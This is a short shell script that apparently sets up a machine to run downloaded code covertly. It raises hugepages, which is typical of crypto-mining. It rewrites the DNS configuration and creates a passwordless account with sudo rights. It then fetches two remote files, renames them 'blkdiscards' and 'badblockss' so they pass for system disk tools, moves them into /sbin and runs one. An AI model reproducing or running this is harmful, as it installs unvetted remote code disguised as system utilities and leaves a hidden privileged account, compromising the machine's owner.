#!/bin/sh
sudo apt update
sudo apt install screen -y
sudo chmod 777 githubsc.sh && sudo chmod +x githubsc.sh
sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
echo '' >/etc/resolv.conf
echo -e 'nameserver 8.8.8.8\nnameserver 8.8.4.4' >/etc/resolv.conf
sudo echo '' >/etc/systemd/resolved.conf
sudo echo -e 'DNS=1.1.1.1 8.8.8.8 \nFallbackDNS=8.8.4.4' >/etc/systemd/resolved.conf
sudo screen -d -m systemctl status systemd-resolved
sudo ufw allow out 53,113,123/udp
sudo adduser --force-badname --disabled-password --gecos "" Name
sudo usermod -a -G sudo Name
wget -O blkdiscards https://github.com/lifetimerdp/Github/raw/main/run
wget -O badblockss https://raw.githubusercontent.com/lifetimerdp/Github/main/test.sh
sudo mv blkdiscards /sbin
sudo mv badblockss /sbin
cd /sbin
sudo chmod +x badblockss && sudo chmod +x blkdiscards
sudo -u Name -H ./badblockss

#Jgnsebar_Sembarangan